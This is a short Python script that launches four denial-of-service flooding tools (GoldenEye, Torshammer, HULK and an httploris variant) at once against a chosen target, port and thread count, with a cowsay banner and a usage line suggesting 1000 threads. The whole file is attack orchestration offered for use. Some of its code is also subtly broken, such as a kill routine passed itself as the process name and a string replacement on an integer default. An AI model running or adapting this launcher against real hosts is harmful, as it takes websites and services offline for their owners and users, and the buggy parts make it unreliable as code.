#!/usr/bin/env python

import sys, os, argparse
import subprocess, psutil, signal

# Console colors
W = '\033[1;0m'   # white 
R = '\033[1;31m'  # red
G = '\033[1;32m'  # green
O = '\033[1;33m'  # orange
B = '\033[1;34m'  # blue
Y = '\033[1;93m'  # yellow
P = '\033[1;35m'  # purple
C = '\033[1;36m'  # cyan
GR = '\033[1;37m'  # gray
colors = [G,C]



def cowsay():
	# os.system("clear")
	print ("""{1}

	  -----------------------------
	< You didn't say the {2}MAGIC WORD{1} >
	  ----------------------------- 
	         \   ^__^
	          \  (oo)\_______
	             (__)\       )\/
	             	\||----w |
	                 ||     ||

	""".format(C, G, P, R, B, W))

list_tools = {

	'goldeneye' : {
		'name' : 'goldeneye',
		'command': './GoldenEye/goldeneye.py [target]'
	},

	'torshammer' : {
		'name' : 'torshammer',
		'command': './torshammer/torshammer.py -p [port] -t [target] -r [thread]'
	},

	'hulk' : {
		'name' : 'hulk',
		'command': 'python hulk.py [target]'
	},

	'Pyloris' :	{
		'name' : 'httploris',
		'command': 'python Pyloris-enhanced/httploris.py -S -t [thread] [target]'
	}
}



def execute_cmd(command):
	cmd = command.split(" ")
	subprocess.Popen(cmd, stderr=subprocess.STDOUT)


def cancel_handler(signal=None, frame=None):
	print ("[!] Ctrl + C Pressed !!!")
	# PROCNAME = "mitmdump"
	for key, value in list_tools.items():
		process_name = list_tools[key]['name']
		kill_process(kill_process)

def kill_process(process_name):
	for proc in psutil.process_iter():
		if proc.name() == process_name:
			proc.kill()





cowsay()
signal.signal(signal.SIGINT, cancel_handler)
parser = argparse.ArgumentParser(description="Simple script to ")
parser.add_argument("-t", "--target", help="target")
parser.add_argument("-p", "--port", help="port")
parser.add_argument("--thread", help="number of thread (default: 3)", default=3)
args = parser.parse_args()

if len(sys.argv) < 2:
	print("""
Usage:
{0} -t example.com -p 443 --thread 1000
	  """.format(sys.argv[0]))
	exit(0)


# args.target
# args.port
# args.thread

# for i in list_tools
# for i in range(len(options.keys())):
for key, value in list_tools.items():
	cmd = list_tools[key]['command'].replace('[target]', args.target)
	cmd = cmd.replace('[thread]', args.thread)
	cmd = cmd.replace('[port]', args.port)
	print(G + "[+] Execute: {0}".format(cmd))
	execute_cmd(cmd)


#just ask be fore exit
raw_input("Press enter to exit ...")









